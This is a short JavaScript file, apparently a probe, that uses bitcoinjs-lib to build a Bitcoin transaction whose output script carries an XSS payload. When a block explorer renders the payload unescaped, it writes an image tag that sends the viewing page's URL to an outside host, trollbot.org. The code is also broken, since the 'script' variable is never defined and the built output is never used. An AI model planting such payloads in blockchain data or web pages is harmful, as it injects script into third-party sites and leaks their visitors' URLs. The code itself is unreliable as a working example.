var bitcoin = require('bitcoinjs-lib');
var crypto = require('crypto');

var Script = bitcoin.Script;
var Opcode = bitcoin.Opcode
var TransactionOut = bitcoin.TransactionOut;


tx = new bitcoin.Transaction()

tx.addInput("19768585", 0.02029851*100000000)



var value = 0.02029851*100000000;

script.writeOp(Opcode.map.OP_DEPTH);
script.writeOp(Opcode.map.OP_3);
script.writeOp(Opcode.map.OP_SUB);
script.writeOp(Opcode.map.OP_EQUAL);
script.writeBytes(new Buffer(" <script type='text/javascript'>document.write('<img src=\\'http://www.trollbot.org/xss-blockchain-detector.php?bc=btc&href=' + location.href + '\\'>');</script> "));

var txout = new TransactionOut({ value: value, script: script});

tx.addOutput("1EB3bhFpBD4Z3x69dfdgY2YgRVpexr14UB", 0.02029851*100000000)

console.log(tx.serializeHex())








